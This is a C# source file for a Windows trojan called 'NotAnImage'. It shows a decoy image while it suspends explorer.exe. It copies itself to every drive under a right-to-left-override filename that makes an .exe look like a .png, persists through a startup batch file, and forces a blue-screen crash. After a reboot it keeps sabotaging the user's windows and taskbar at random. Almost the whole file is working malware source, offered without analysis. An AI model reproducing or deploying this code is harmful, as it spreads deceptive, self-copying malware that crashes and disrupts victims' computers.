using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Diagnostics;
using Payloads;
using System.Threading;
using Microsoft.Win32;
using System.Timers;
using System.Drawing;

namespace NotAnImage
{
    static class Program
    {
        static System.Timers.Timer Timer = new System.Timers.Timer(1000);
        static Random Random = new Random();

        static void Main(string[] args)
        {
            if (args != null)
            {
                if (args.Length > 0)
                {
                    Startup();
                    return;
                }
            }
            string path = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".png");
            Resources.img.Save(path);
            Process.Start(path);
            StartNormal();
        }

        static void StartNormal()
        {
            try
            {
                int explorer = Process.GetProcessesByName("explorer")[0].Id;//save it so that we can seset the UI later on
                char rev = '\u202E';
                Processes.SuspendProcess(explorer);//suspends explorer.exe so the windows UI and stuff won't work. can't recover without an open cmd window
                
                //now we can do stuff

                if (Explorer.AreDesktopIconsVisible())//hide desktop icons
                {
                    Explorer.ToggleDesktopIconsVisibility();
                }

                //Copy this program to all drives
                Duplicate();

                //setup this program at startup
                SetupStartup();

                //setup regis‮try keys
                SetupRegistry();
                //resume explorer
                Processes.Resume‮P‮rocess(explorer);

                //BSoD
                Miscellaneous.Crash();
            }
            catch
            {
                Miscellaneous.Crash();//if any error occurres, show BSoD
            }

        }

        private static void Duplicate()
        {
            char rev = '\u202E';

            foreach (DriveInfo d in DriveInfo.GetDrives())
            {
                //copy this program in all drives
                try
                {
                    File.Copy(Application.ExecutablePath, Path.Combine(d.RootDirectory.FullName, "imag" + rev + "gnp.exe"));
                }
                catch
                {
                    Debug.WriteLine("Could not write to drive " + d.Name);
                }
            }
        }

        private static void SetupStartup()
        {
            string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "NotAnImage.bat");//the batch file path

            string execPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "NotAnImage");//the new executable path

            Directory.CreateDirectory(execPath);//create the directory for the executable

            File.Copy(Application.ExecutablePath, Path.Combine(execPath, "NotAnImage.exe"));//copy the executable to the new path

            File.WriteAllText(startupPath, @"start %appdata%\NotAnImage\NotAnImage.exe STARTUP");//create the batch file
        }

        private static void SetupRegistry()
        {
            //Registry.SetValue();
        }

        static void Startup()
        {
            Timer.AutoReset = true;
            Timer.Elapsed += Timer_Elapsed;
            Timer.Start();
            while (true)
            {

            }
        }

        private static void Timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            int i = Random.Next(0, 10);
            switch(i)
            {
                case 0://flip left
                    {
                        IntPtr hwnd = WindowsAPI.Window.GetFocused();
                        WindowsAPI.Window.FlipLeft(hwnd);
                        break;
                    }
                case 1://flip right
                    {
                        IntPtr hwnd = WindowsAPI.Window.GetFocused();
                        WindowsAPI.Window.FlipRight(hwnd);
                        break;
                    }
                case 2://minimize
                    {
                        IntPtr hwnd = WindowsAPI.Window.GetFocused();
                        WindowsAPI.Window.Minimize(hwnd);
                        break;
                    }
                case 3://maximize
                    {
                        IntPtr hwnd = WindowsAPI.Window.GetFocused();
                        WindowsAPI.Window.Maximize(hwnd);
                        break;
                    }
                case 4://remove menu and buttons
                    {
                        IntPtr hwnd = WindowsAPI.Window.GetFocused();
                        WindowsAPI.Window.RemoveMenu(hwnd);
                        WindowsAPI.Window.DisableCloseButton(hwnd);
                        WindowsAPI.Window.DisableMaximizeButton(hwnd);
                        WindowsAPI.Window.DisableMinimizeButton(hwnd);
                        break;
                    }
                case 5://scale down window
                    {
                        IntPtr hwnd = WindowsAPI.Window.GetFocused();
                        Size normal = WindowsAPI.Window.GetSize(hwnd);
                        int s = Random.Next(1, 5);
                        WindowsAPI.Window.Resize(hwnd, normal.Width / s, normal.Height / s);
                        break;
                    }
                case 6://shuffle title
                    {
                        IntPtr hwnd = WindowsAPI.Window.GetFocused();
                        string title = WindowsAPI.Window.GetTitle(hwnd);
                        if (title == null)
                        {
                            break;
                        }
                        string[] split = title.Split(' '); //create a new string array with all the words separated
                        string[] txt2 = split.OrderBy(x => Random.Next(0, split.Length)).ToArray(); //Shuffle the array
                        string final = ""; //create the pasting string
                        foreach (string s in txt2) //loop strings
                        {
                            if (!(final.Equals(""))) //spaces management, to add a space at the end of the previous word
                            {
                                final = final + ' ' + s;
                            }
                            else
                            {
                                final = s;
                            }
                        }
                        WindowsAPI.Window.SetTitle(hwnd, final);
                        break;
                    }
                case 7://move window
                    {
                        IntPtr hwnd = WindowsAPI.Window.GetFocused();
                        Point p = WindowsAPI.Window.GetLocation(hwnd);
                        int x = p.X + Random.Next(-50, 50);
                        int y = p.Y + Random.Next(-50, 50);

                        WindowsAPI.Window.Move(hwnd, x, y);
                        break;
                    }
                case 8://hide taskbar
                    {
                        WindowsAPI.Desktop.HideTaskBar();
                        break;
                    }
                case 9://show taskbar
                    {
                        WindowsAPI.Desktop.ShowTaskBar();
                        break;
                    }
                case 10://draw bitmap
                    {
                        Drawing.DrawBitmapToScreen(Resources.img);
                        break;
                    }
            }
        }
    }
}